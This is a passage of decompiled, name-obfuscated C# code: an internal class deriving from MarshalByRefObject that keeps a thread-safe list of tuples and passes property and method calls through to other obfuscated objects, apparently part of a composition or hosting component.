    internal class jyyz3jf : MarshalByRefObject
    {
      private List<Tuple<\u0037jxjFzS, string, string>> KaOq1jy;
      private jUU2Be4 \u00347ts5dI;
      public bmWbPt6 gAdxWFU;

      public List<Tuple<\u0037jxjFzS, string, string>> h3Yfdgm => this.KaOq1jy;

      public string ZwNYmv1 => ((bmWbPt6.Sq6ZTAc) this).YkhyOY8.\u00361JHibz;

      public IEnumerable<string> zB22bnc => ((bmWbPt6.Sq6ZTAc) this).YkhyOY8.MMTjoeG;

      public long nB50oNu => this.\u00347ts5dI.\u0033Tx9kQI;

      public long h8XtRg3 => this.\u00347ts5dI.wE4XKrm;

      public bool pGWNOCK => this.\u00347ts5dI.pxBMSPO;

      public string Kg0nvAo => this.\u00347ts5dI.d2Ww44u;

      public IEnumerable<string> xSfKzuh(IEnumerable<string> g5ZGLMP) => ((bmWbPt6.Sq6ZTAc) this).YkhyOY8.t03qVgI(g5ZGLMP);

      public void hP0UBjM(int LVZscZj, string q4XEzre, string b6umzQi)
      {
        lock (this.KaOq1jy)
          this.KaOq1jy.Add(Tuple.Create<\u0037jxjFzS, string, string>((\u0037jxjFzS) LVZscZj, q4XEzre, b6umzQi));
      }

      public IEnumerable<string> \u0038muf9rH(string EsoAwMn)
      {
        zINRWpL zInrWpL;
        return ((bmWbPt6.Sq6ZTAc) this).YkhyOY8.QVBCo6i.TryGetValue(EsoAwMn, out zInrWpL) ? (IEnumerable<string>) zInrWpL.J4biWWt.ToArray<string>() : (IEnumerable<string>) Array.Empty<string>();
      }

      public bool iSwpUD9(out ICompositionScopeCreator aJxEJhM) => this.\u00347ts5dI.W8lUGVq(out aJxEJhM);

      public void MidefEQ() => this.\u00347ts5dI.\u0039bPR8In();
    }
  }
}
